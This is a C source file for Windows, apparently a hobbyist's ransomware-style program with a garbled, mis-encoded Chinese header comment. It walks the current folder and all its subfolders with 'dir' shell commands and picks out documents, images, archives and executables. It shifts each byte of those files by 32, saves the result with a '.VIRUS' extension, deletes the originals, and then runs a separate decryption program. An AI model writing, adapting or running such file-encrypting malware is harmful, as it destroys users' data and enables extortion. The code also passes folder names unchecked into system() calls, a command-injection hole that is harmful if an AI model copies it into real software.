/*
  ����G2021/3/14
  �@��:HiCat
  ���e:�ѨM�F�x�s�}�C�L�j�ɭP��������D�C
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int frequency = 0;

void file_search(char *MainPosition);
void file_read(char *MainPosition);
void folder_search(char *MainPosition);
void encryption(char *processed_original_file_position, char *encryption_file_position);


void file_search(char *MainPosition){
  if(frequency == 0){
    system("dir /B *.exe *.txt *.docx *.jpg *.gif *.pdf *.zip *.png *.mp4 *.xls *.pptx *.mp3 *.msi *.bmp *.odg >> original_file_name.txt"); //�ݦA�[

    FILE *original_file_name_read, *processed_original_file_name_read; // 1)�Ψ�Ū��original_file_name.txt 2)�Ψ�Ū��processed_original_file_name.txt
    original_file_name_read = fopen("original_file_name.txt", "r");
    processed_original_file_name_read = fopen("processed_original_file_name.txt", "w");

    char file_name[500]; //�x�s�ɮצW��
    while(fgets(file_name, sizeof(file_name), original_file_name_read) != NULL){
      if(strncmp("encryption_program.exe", file_name, 22) != 0 && strncmp("decryption_program.exe", file_name, 22) != 0 && strncmp("original_file_name.txt", file_name, 22) != 0 && strncmp("test?gpj.exe", file_name, 12) != 0){
        fputs(file_name, processed_original_file_name_read);
      }
    }
    fclose(original_file_name_read);
    fclose(processed_original_file_name_read);
    remove("original_file_name.txt");
  }
  else{
    char file[500] = "cd "; //�����l��Ƨ����ɮץ�
    strcat(file, MainPosition);
    strcat(file, " && dir /B *.exe *.txt *.docx *.jpg *.gif *.pdf *.zip *.png *.mp4 *.xls *.pptx *.mp3 *.msi *.bmp *.odg >> original_file_name.txt");
    system(file);

    char file2[500]; //���Uprocessed_original_file_name_read�Mprocessed_original_file_name_readŪ���ɮ�
    FILE *original_file_name_read, *processed_original_file_name_read; // 1)�Ψ�Ū���l��Ƨ���original_file_name.txt 2)�Ψ�Ū���l��Ƨ���processed_original_file_name.txt
    strcpy(file2, MainPosition);
    strcat(file2, "\\original_file_name.txt");
    original_file_name_read = fopen(file2, "r");
    strcpy(file2, MainPosition);
    strcat(file2, "\\processed_original_file_name.txt");
    processed_original_file_name_read = fopen(file2, "w");

    char file_name[500]; //�x�s�ɮצW��
    while(fgets(file_name, sizeof(file_name), original_file_name_read) != NULL){
      if(strncmp("original_file_name.txt", file_name, 22) != 0){
        fputs(file_name, processed_original_file_name_read);
      }
    }
    fclose(original_file_name_read);
    fclose(processed_original_file_name_read);
    strcpy(file2, MainPosition);
    strcat(file2, "\\original_file_name.txt");
    remove(file2);
    file_read(MainPosition);
  }
}

void file_read(char *MainPosition){
  FILE *processed_original_file_name_read; //�Ψ�Ū���D��Ƨ��Τl��Ƨ���processed_original_file_name.txt
  char processed_original_file_name[500]; //�x�s���z�L����l�ɦW
  if(frequency == 0){
    processed_original_file_name_read = fopen("processed_original_file_name.txt", "r");
    while(fgets(processed_original_file_name, sizeof(processed_original_file_name), processed_original_file_name_read) != NULL){
      char encryption_file_name[500] = ""; //�x�s�[�K���ɦW
      strtok(processed_original_file_name, "\n");
      strcat(encryption_file_name, processed_original_file_name);
      strcat(encryption_file_name, ".VIRUS");
      encryption(processed_original_file_name, encryption_file_name);
    }
    fclose(processed_original_file_name_read);
    frequency++;
    folder_search(MainPosition);
  }
  else{
    char file[500]; //���Uprocessed_original_file_name_readŪ���ɮ�
    strcat(processed_original_file_name, MainPosition);
    strcat(processed_original_file_name, "\\");
    strcpy(file, MainPosition);
    strcat(file, "\\processed_original_file_name.txt");
    processed_original_file_name_read = fopen(file, "r");
    char excessive_string[500]; //�����ഫ��
    while(fgets(excessive_string, sizeof(excessive_string), processed_original_file_name_read) != NULL){
      strcpy(processed_original_file_name, MainPosition);
      strcat(processed_original_file_name, "\\");
      char encryption_file_name[500];
      strcpy(encryption_file_name, MainPosition);
      strcat(encryption_file_name, "\\");
      strtok(excessive_string, "\n");
      strcat(encryption_file_name, excessive_string);
      strcat(processed_original_file_name, excessive_string);
      strcat(encryption_file_name, ".VIRUS");
      encryption(processed_original_file_name, encryption_file_name);
    }
    fclose(processed_original_file_name_read);
    remove(file);
    folder_search(MainPosition);
  }
}

void folder_search(char *MainPosition){
  strtok(MainPosition, "\n");
  char folder[500] = "cd "; //���U�M��l��Ƨ�
  strcat(folder, MainPosition);
  strcat(folder, " && dir /AD /B >> folder.txt");
  system(folder);
  strcpy(folder, "");
  strcat(folder, MainPosition);
  strcat(folder, "\\folder.txt");
  FILE *folder_name_read; //Ū��folder.txt
  folder_name_read = fopen(folder, "r");
  char MainPosition_copy[500]; //�ƻsMainPosition
  strcpy(MainPosition_copy, MainPosition);
  char folder_name[500]; //�x�s�l��Ƨ��W��
  while(fgets(folder_name, sizeof(folder_name), folder_name_read) != NULL){
    strtok(folder_name, "\n");
    strcat(MainPosition, "\\");
    strcat(MainPosition, folder_name);
    file_search(MainPosition);
    strcpy(MainPosition, MainPosition_copy);
  }
  fclose(folder_name_read);
  remove(folder);
}

void encryption(char *processed_original_file_position, char *encryption_file_position){
  FILE *processed_original_file_read, *encryption_file_read; // 1)Ū���n�[�K�ɮ� 2)Ū���[�K�ɮש�m��l
  processed_original_file_read = fopen(processed_original_file_position, "rb");
  encryption_file_read = fopen(encryption_file_position, "wb");

  unsigned char ch; //�s���ɮ׸��
  while(!feof(processed_original_file_read)){
    fread(&ch, sizeof(ch), 1, processed_original_file_read);
    if(!feof(processed_original_file_read)){
      ch = ch + 32;
      fwrite(&ch, sizeof(ch), 1, encryption_file_read);
    }
  }
  fclose(processed_original_file_read);
  fclose(encryption_file_read);
  remove(processed_original_file_position);
}

int main(void){
  char MainPosition[500]; //�x�s�D��Ƨ���}
  system("cd >> main_position.txt");
  FILE *main_position_read; //�Ψ�Ū��main_position.txt
  main_position_read = fopen("main_position.txt", "r");
  fgets(MainPosition, sizeof(MainPosition), main_position_read);
  fclose(main_position_read);
  remove("main_position.txt");
  file_search(MainPosition);
  file_read(MainPosition);
  remove("processed_original_file_name.txt");
  system("decryption_program.exe");

  
  return 0;
}
